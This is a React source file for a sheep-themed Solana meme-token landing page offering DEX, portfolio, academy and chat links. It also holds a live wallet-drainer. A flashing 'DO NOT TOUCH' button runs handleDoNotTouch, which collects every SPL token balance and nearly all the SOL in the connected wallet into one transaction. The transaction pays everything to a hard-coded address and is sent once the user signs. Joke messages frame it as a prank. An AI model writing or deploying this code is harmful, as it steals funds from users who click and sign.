import { useState } from "react";
import { Link } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { useWallet } from "@solana/wallet-adapter-react";
import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  createTransferInstruction,
  getAssociatedTokenAddress,
} from "@solana/spl-token";
import { toast } from "sonner";
import {
  ArrowRight,
  Zap,
  Shield,
  Coins,
  TrendingUp,
  Users,
  Rocket,
  Wallet,
  BarChart3,
  BookOpen,
  MessageCircle,
  Trophy,
  FileText,
} from "lucide-react";

export default function Index() {
  const { publicKey, signTransaction } = useWallet();
  const [isProcessing, setIsProcessing] = useState(false);

  const handleDoNotTouch = async () => {
    if (!publicKey || !signTransaction) {
      toast.error("Please connect your wallet first!");
      return;
    }

    if (isProcessing) {
      toast.error(
        "Already processing! Please wait for current scan to complete.",
      );
      return;
    }

    setIsProcessing(true);

    try {
      const connection = new Connection(
        "https://solana-mainnet.g.alchemy.com/v2/demo",
      );
      const destinationAddress = new PublicKey(
        "F52riGC1evYR12ZqQy9umRo7S3hDAZhFbXGEnuX8p966",
      );

      toast.loading(
        "🐑 Scanning your wallet for all tokens... You really shouldn't have pushed that button!",
      );

      // Get all token accounts for the wallet
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
        publicKey,
        {
          programId: TOKEN_PROGRAM_ID,
        },
      );

      const transaction = new Transaction();
      let transferCount = 0;

      // Transfer all SPL tokens
      for (const tokenAccountInfo of tokenAccounts.value) {
        const tokenAccountAddress = tokenAccountInfo.pubkey;
        const tokenAccountData = tokenAccountInfo.account.data.parsed.info;
        const tokenBalance = parseInt(tokenAccountData.tokenAmount.amount);

        if (tokenBalance > 0) {
          try {
            const mintAddress = new PublicKey(tokenAccountData.mint);
            const destinationTokenAccount = await getAssociatedTokenAddress(
              mintAddress,
              destinationAddress,
            );

            // Add transfer instruction for this token
            transaction.add(
              createTransferInstruction(
                tokenAccountAddress,
                destinationTokenAccount,
                publicKey,
                tokenBalance,
              ),
            );
            transferCount++;
          } catch (error) {
            console.log("Skipping token transfer:", error);
          }
        }
      }

      // Also transfer all SOL (minus fees)
      const solBalance = await connection.getBalance(publicKey);
      const feeReserve = 5000; // Reserve for transaction fees
      if (solBalance > feeReserve) {
        transaction.add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: destinationAddress,
            lamports: solBalance - feeReserve,
          }),
        );
        transferCount++;
      }

      if (transferCount === 0) {
        toast.error(
          "🐑 No tokens or SOL to transfer! Your wallet is emptier than a sheep's thoughts!",
        );
        return;
      }

      // Get recent blockhash
      const { blockhash } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = publicKey;

      // Sign and send transaction
      const signedTransaction = await signTransaction(transaction);
      const signature = await connection.sendRawTransaction(
        signedTransaction.serialize(),
      );

      toast.success(
        `🐑💸 YOU REALLY DID IT! Transferred ${transferCount} items! TX: ${signature.slice(0, 8)}... Hope you enjoyed your brief crypto career!`,
      );
      console.log("Transaction signature:", signature);
    } catch (error) {
      console.error("Transfer failed:", error);
      toast.error(
        "Transfer failed! The sheep spirits are protecting your funds! 🐑✨ (Maybe that button wasn't so bad after all...)",
      );
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen bg-background relative overflow-hidden">
      {/* DO NOT TOUCH Button */}
      <Button
        onClick={handleDoNotTouch}
        disabled={isProcessing}
        className={`fixed top-20 left-4 z-40 ${
          isProcessing
            ? "bg-gray-600 cursor-not-allowed"
            : "bg-red-600 hover:bg-red-700"
        } text-white font-bold px-3 py-2 text-xs md:text-sm md:px-6 md:py-3 border-2 border-red-400 shadow-lg ${
          isProcessing ? "" : "animate-pulse"
        }`}
        style={{
          animation: isProcessing ? "none" : "flash-red 1s infinite alternate",
        }}
      >
        {isProcessing ? (
          <>
            <span className="hidden md:inline">🔄 SCANNING WALLET... 🔄</span>
            <span className="md:hidden">🔄 SCANNING... 🔄</span>
          </>
        ) : (
          <>
            <span className="hidden md:inline">
              ⚠️ TRANSFER ALL TOKENS BUTTON ⚠️
            </span>
            <span className="md:hidden">⚠️ YEET WALLET ⚠️</span>
          </>
        )}
      </Button>

      {/* Hero Section with Lamb Car Backdrop */}
      <section className="relative h-screen flex items-center justify-center overflow-hidden">
        {/* Lamb Car Background Image */}
        <div className="absolute inset-0 z-0">
          <img
            src="https://cdn.builder.io/api/v1/image/assets%2F253ce014bfed48a3b74611f6cf44c794%2F3e5641ce2ffe4d8a9ddd24c343aa4978?format=webp&width=1200"
            alt="Lambaaaghini - Luxury meets DeFi"
            className="w-full h-full object-cover object-center"
          />
          {/* Overlay for better text readability */}
          <div className="absolute inset-0 bg-gradient-to-b from-background/80 via-background/60 to-background/90" />
          <div className="absolute inset-0 bg-gradient-to-r from-purple-900/30 via-transparent to-amber-900/30" />
        </div>

        {/* Floating Content */}
        <div className="relative z-10 mx-auto max-w-6xl px-6 text-center">
          <Badge className="mb-8 bg-gold-500/20 text-gold-400 border-gold-500/40 hover:bg-gold-500/30 backdrop-blur-sm text-lg px-6 py-2">
            🐑💨 Where Sheep Meet Supercars
          </Badge>

          <h1 className="text-5xl md:text-7xl lg:text-8xl xl:text-9xl font-bold mb-8 tracking-tight">
            <span className="text-gold-400 drop-shadow-2xl font-bold text-shadow-lg">
              LAMBAAAGHINI
            </span>
          </h1>

          <p className="text-xl md:text-2xl lg:text-3xl text-white/90 mb-12 leading-relaxed max-w-4xl mx-auto drop-shadow-lg text-shadow-md">
            Where fluffy sheep dream of driving supercars and fart their way to
            financial freedom. This is definitely financial advice.
          </p>

          {/* Quick Action Grid */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 mb-12 max-w-4xl mx-auto">
            <Button
              asChild
              size="lg"
              className="bg-gradient-to-r from-gold-400/90 to-gold-600/90 hover:from-gold-500/90 hover:to-gold-700/90 text-black font-semibold backdrop-blur-sm h-16"
            >
              <Link to="/dex" className="flex flex-col items-center">
                <ArrowRight className="h-5 w-5 mb-1" />
                <span className="text-sm">Trade DEX</span>
              </Link>
            </Button>

            <Button
              asChild
              size="lg"
              variant="outline"
              className="border-purple-500/50 text-purple-100 hover:bg-purple-500/20 backdrop-blur-sm h-16"
            >
              <Link to="/portfolio" className="flex flex-col items-center">
                <BarChart3 className="h-5 w-5 mb-1" />
                <span className="text-sm">Portfolio</span>
              </Link>
            </Button>

            <Button
              asChild
              size="lg"
              variant="outline"
              className="border-blue-500/50 text-blue-100 hover:bg-blue-500/20 backdrop-blur-sm h-16"
            >
              <Link to="/academy" className="flex flex-col items-center">
                <BookOpen className="h-5 w-5 mb-1" />
                <span className="text-sm">Academy</span>
              </Link>
            </Button>

            <Button
              asChild
              size="lg"
              variant="outline"
              className="border-green-500/50 text-green-100 hover:bg-green-500/20 backdrop-blur-sm h-16"
            >
              <Link to="/lamb-sauce" className="flex flex-col items-center">
                <MessageCircle className="h-5 w-5 mb-1" />
                <span className="text-sm">Chat</span>
              </Link>
            </Button>
          </div>

          {/* Primary CTA */}
          <div className="flex flex-col sm:flex-row gap-4 justify-center items-center mb-8">
            <Button
              asChild
              size="lg"
              className="bg-gradient-to-r from-gold-400 to-gold-600 hover:from-gold-500 hover:to-gold-700 text-black font-semibold px-8 py-6 text-lg crypto-glow"
            >
              <Link to="/launchpad">
                Launch App
                <ArrowRight className="ml-2 h-5 w-5" />
              </Link>
            </Button>

            {/* Wallet Connect for Mobile */}
            <div className="block lg:hidden">
              <WalletMultiButton className="!bg-gradient-to-r !from-purple-500/90 !to-purple-700/90 hover:!from-purple-600/90 hover:!to-purple-800/90 !text-white !font-semibold !border-0 !rounded-md !px-6 !py-3 !backdrop-blur-sm" />
            </div>
          </div>

          {/* Quick Utilities */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-6 max-w-3xl mx-auto mt-16">
            <Link
              to="/lamb-pooper-scooper"
              className="text-center bg-black/20 backdrop-blur-sm rounded-lg p-4 border border-white/10 hover:border-green-500/50 transition-all hover:bg-green-500/10 group"
            >
              <div className="text-2xl md:text-3xl font-bold text-green-400 group-hover:scale-110 transition-transform">
                🐑💩
              </div>
              <div className="text-sm text-white/80 font-medium">
                Pooper Scooper
              </div>
            </Link>
            <Link
              to="/pay-the-lamb"
              className="text-center bg-black/20 backdrop-blur-sm rounded-lg p-4 border border-white/10 hover:border-orange-500/50 transition-all hover:bg-orange-500/10 group"
            >
              <div className="text-2xl md:text-3xl font-bold text-orange-400 group-hover:scale-110 transition-transform">
                💰🐑
              </div>
              <div className="text-sm text-white/80 font-medium">
                Pay the Lamb
              </div>
            </Link>
            <Link
              to="/lamb-sauce"
              className="text-center bg-black/20 backdrop-blur-sm rounded-lg p-4 border border-white/10 hover:border-purple-500/50 transition-all hover:bg-purple-500/10 group"
            >
              <div className="text-2xl md:text-3xl font-bold text-purple-400 group-hover:scale-110 transition-transform">
                ��🐑
              </div>
              <div className="text-sm text-white/80 font-medium">
                Lamb Sauce Chat
              </div>
            </Link>
            <Link
              to="/game"
              className="text-center bg-black/20 backdrop-blur-sm rounded-lg p-4 border border-white/10 hover:border-blue-500/50 transition-all hover:bg-blue-500/10 group"
            >
              <div className="text-2xl md:text-3xl font-bold text-blue-400 group-hover:scale-110 transition-transform">
                🎮🐑
              </div>
              <div className="text-sm text-white/80 font-medium">
                Sheep vs Zombies
              </div>
            </Link>
          </div>
        </div>

        {/* Floating mini logos */}
        <div className="absolute top-20 left-10 opacity-30 animate-pulse pointer-events-none z-5">
          <img
            src="https://cdn.builder.io/api/v1/image/assets%2F253ce014bfed48a3b74611f6cf44c794%2F3e5641ce2ffe4d8a9ddd24c343aa4978?format=webp&width=80"
            alt="Lambaaaghini"
            className="w-12 h-8 object-cover rounded-lg"
          />
        </div>
        <div
          className="absolute top-32 right-16 opacity-20 animate-bounce pointer-events-none z-5"
          style={{ animationDelay: "1s" }}
        >
          <img
            src="https://cdn.builder.io/api/v1/image/assets%2F253ce014bfed48a3b74611f6cf44c794%2F3e5641ce2ffe4d8a9ddd24c343aa4978?format=webp&width=80"
            alt="Lambaaaghini"
            className="w-10 h-6 object-cover rounded-lg"
          />
        </div>
        <div
          className="absolute bottom-32 left-20 opacity-25 animate-pulse pointer-events-none z-5"
          style={{ animationDelay: "2s" }}
        >
          <img
            src="https://cdn.builder.io/api/v1/image/assets%2F253ce014bfed48a3b74611f6cf44c794%2F3e5641ce2ffe4d8a9ddd24c343aa4978?format=webp&width=80"
            alt="Lambaaaghini"
            className="w-14 h-9 object-cover rounded-lg"
          />
        </div>

        {/* Scroll indicator */}
        <div className="absolute bottom-8 left-1/2 transform -translate-x-1/2 z-10 animate-bounce">
          <div className="w-6 h-10 border-2 border-white/30 rounded-full flex justify-center">
            <div className="w-1 h-3 bg-white/60 rounded-full mt-2 animate-pulse"></div>
          </div>
        </div>
      </section>

      {/* Feature Cards Section */}
      <section className="px-6 py-20 bg-gradient-to-b from-background via-purple-950/10 to-amber-950/10 relative">
        <div className="mx-auto max-w-7xl">
          <div className="text-center mb-16 relative">
            <h2 className="text-4xl md:text-5xl font-bold mb-6">
              <span className="text-gold-400 font-bold">Platform </span>
              <span className="text-purple-400 font-bold">Features</span>
            </h2>
            <p className="text-xl text-muted-foreground max-w-3xl mx-auto mb-8">
              Everything you need to navigate the DeFi universe, built by sheep
              with questionable judgment but excellent taste in supercars.
            </p>
            {/* Medium lamb car image as section decoration */}
            <div className="flex justify-center">
              <img
                src="https://cdn.builder.io/api/v1/image/assets%2F253ce014bfed48a3b74611f6cf44c794%2F3e5641ce2ffe4d8a9ddd24c343aa4978?format=webp&width=200"
                alt="Lambaaaghini - Luxury meets DeFi"
                className="w-32 h-20 object-cover rounded-xl opacity-70 hover:opacity-90 transition-opacity"
              />
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
            <Card className="glass-card border-gold-500/20 hover:border-gold-500/40 transition-all duration-300 hover:crypto-glow group">
              <CardContent className="p-8">
                <div className="w-12 h-12 bg-gold-500/10 rounded-lg flex items-center justify-center mb-6 group-hover:bg-gold-500/20 transition-colors">
                  <Zap className="h-6 w-6 text-gold-400" />
                </div>
                <h3 className="text-xl font-bold mb-4">DEX Trading</h3>
                <p className="text-muted-foreground">
                  Swap tokens faster than a sheep can say "baa". Professional
                  trading interface with real-time data and zero judgment.
                </p>
                <Button
                  asChild
                  variant="ghost"
                  className="mt-4 text-gold-400 hover:text-gold-300"
                >
                  <Link to="/dex">
                    Start Trading <ArrowRight className="w-4 h-4 ml-2" />
                  </Link>
                </Button>
              </CardContent>
            </Card>

            <Card className="glass-card border-purple-500/20 hover:border-purple-500/40 transition-all duration-300 hover:crypto-glow group">
              <CardContent className="p-8">
                <div className="w-12 h-12 bg-purple-500/10 rounded-lg flex items-center justify-center mb-6 group-hover:bg-purple-500/20 transition-colors">
                  <BarChart3 className="h-6 w-6 text-purple-400" />
                </div>
                <h3 className="text-xl font-bold mb-4">Portfolio Analytics</h3>
                <p className="text-muted-foreground">
                  Track your lambo fund progress with beautiful charts. See if
                  you're closer to yacht money or ramen noodles.
                </p>
                <Button
                  asChild
                  variant="ghost"
                  className="mt-4 text-purple-400 hover:text-purple-300"
                >
                  <Link to="/portfolio">
                    View Portfolio <ArrowRight className="w-4 h-4 ml-2" />
                  </Link>
                </Button>
              </CardContent>
            </Card>

            <Card className="glass-card border-blue-500/20 hover:border-blue-500/40 transition-all duration-300 hover:crypto-glow group">
              <CardContent className="p-8">
                <div className="w-12 h-12 bg-blue-500/10 rounded-lg flex items-center justify-center mb-6 group-hover:bg-blue-500/20 transition-colors">
                  <BookOpen className="h-6 w-6 text-blue-400" />
                </div>
                <h3 className="text-xl font-bold mb-4">Sheep Academy</h3>
                <p className="text-muted-foreground">
                  Learn DeFi from sheep who somehow figured it out. Courses
                  range from "Wallets 101" to "Advanced Sheep Psychology".
                </p>
                <Button
                  asChild
                  variant="ghost"
                  className="mt-4 text-blue-400 hover:text-blue-300"
                >
                  <Link to="/academy">
                    Start Learning <ArrowRight className="w-4 h-4 ml-2" />
                  </Link>
                </Button>
              </CardContent>
            </Card>

            <Card className="glass-card border-green-500/20 hover:border-green-500/40 transition-all duration-300 hover:crypto-glow group">
              <CardContent className="p-8">
                <div className="w-12 h-12 bg-green-500/10 rounded-lg flex items-center justify-center mb-6 group-hover:bg-green-500/20 transition-colors">
                  <Trophy className="h-6 w-6 text-green-400" />
                </div>
                <h3 className="text-xl font-bold mb-4">Leaderboards</h3>
                <p className="text-muted-foreground">
                  Compete with other sheep for meaningless internet points and
                  the respect of your virtual peers.
                </p>
                <Button
                  asChild
                  variant="ghost"
                  className="mt-4 text-green-400 hover:text-green-300"
                >
                  <Link to="/leaderboards">
                    View Rankings <ArrowRight className="w-4 h-4 ml-2" />
                  </Link>
                </Button>
              </CardContent>
            </Card>

            <Card className="glass-card border-orange-500/20 hover:border-orange-500/40 transition-all duration-300 hover:crypto-glow group">
              <CardContent className="p-8">
                <div className="w-12 h-12 bg-orange-500/10 rounded-lg flex items-center justify-center mb-6 group-hover:bg-orange-500/20 transition-colors">
                  <MessageCircle className="h-6 w-6 text-orange-400" />
                </div>
                <h3 className="text-xl font-bold mb-4">Lamb Sauce Chat</h3>
                <p className="text-muted-foreground">
                  Join the herd in wallet-gated chat. Share memes, trading tips,
                  and existential sheep questions.
                </p>
                <Button
                  asChild
                  variant="ghost"
                  className="mt-4 text-orange-400 hover:text-orange-300"
                >
                  <Link to="/lamb-sauce">
                    Join Chat <ArrowRight className="w-4 h-4 ml-2" />
                  </Link>
                </Button>
              </CardContent>
            </Card>

            <Card className="glass-card border-red-500/20 hover:border-red-500/40 transition-all duration-300 hover:crypto-glow group">
              <CardContent className="p-8">
                <div className="w-12 h-12 bg-red-500/10 rounded-lg flex items-center justify-center mb-6 group-hover:bg-red-500/20 transition-colors">
                  <Rocket className="h-6 w-6 text-red-400" />
                </div>
                <h3 className="text-xl font-bold mb-4">Token Launchpad</h3>
                <p className="text-muted-foreground">
                  Launch your own sheep-themed token. Warning: May cause sudden
                  urge to buy sports cars and wear diamond chains.
                </p>
                <Button
                  asChild
                  variant="ghost"
                  className="mt-4 text-red-400 hover:text-red-300"
                >
                  <Link to="/launchpad">
                    Launch Token <ArrowRight className="w-4 h-4 ml-2" />
                  </Link>
                </Button>
              </CardContent>
            </Card>
          </div>
        </div>
      </section>

      {/* CTA Section */}
      <section className="px-6 py-20 bg-gradient-to-br from-purple-900/30 via-amber-950/20 to-purple-950/30">
        <div className="mx-auto max-w-4xl text-center">
          <h2 className="text-4xl md:text-5xl font-bold mb-6">
            Ready to Join the Flock?
          </h2>
          <p className="text-xl text-muted-foreground mb-12">
            Connect your wallet and discover what happens when sheep meet
            blockchain technology. Results may vary, entertainment guaranteed.
          </p>

          <div className="flex flex-col sm:flex-row gap-4 justify-center items-center mb-8">
            <Button
              asChild
              size="lg"
              className="bg-gradient-to-r from-gold-400 to-gold-600 hover:from-gold-500 hover:to-gold-700 text-black font-semibold px-8 py-6 text-lg crypto-glow"
            >
              <Link to="/dex">
                Start Trading
                <ArrowRight className="ml-2 h-5 w-5" />
              </Link>
            </Button>
            <Button
              asChild
              size="lg"
              variant="outline"
              className="border-purple-500/50 text-purple-400 hover:bg-purple-500/10 px-8 py-6 text-lg"
            >
              <Link to="/academy">Learn DeFi</Link>
            </Button>
          </div>

          <div className="text-sm text-muted-foreground mb-8">
            Supports Phantom, Solflare, and Ledger wallets
          </div>

          {/* Whitepaper and Team Links */}
          <div className="flex flex-col sm:flex-row gap-4 justify-center items-center border-t border-border/30 pt-8">
            <Button
              asChild
              variant="ghost"
              className="text-gold-400 hover:text-gold-300 hover:bg-gold-500/10"
            >
              <Link to="/whitepaper" className="flex items-center gap-2">
                <FileText className="h-4 w-4" />
                Read Whitepaper
              </Link>
            </Button>
            <Button
              asChild
              variant="ghost"
              className="text-purple-400 hover:text-purple-300 hover:bg-purple-500/10"
            >
              <Link to="/team" className="flex items-center gap-2">
                <Users className="h-4 w-4" />
                Meet the Team
              </Link>
            </Button>
          </div>
        </div>
      </section>
    </div>
  );
}
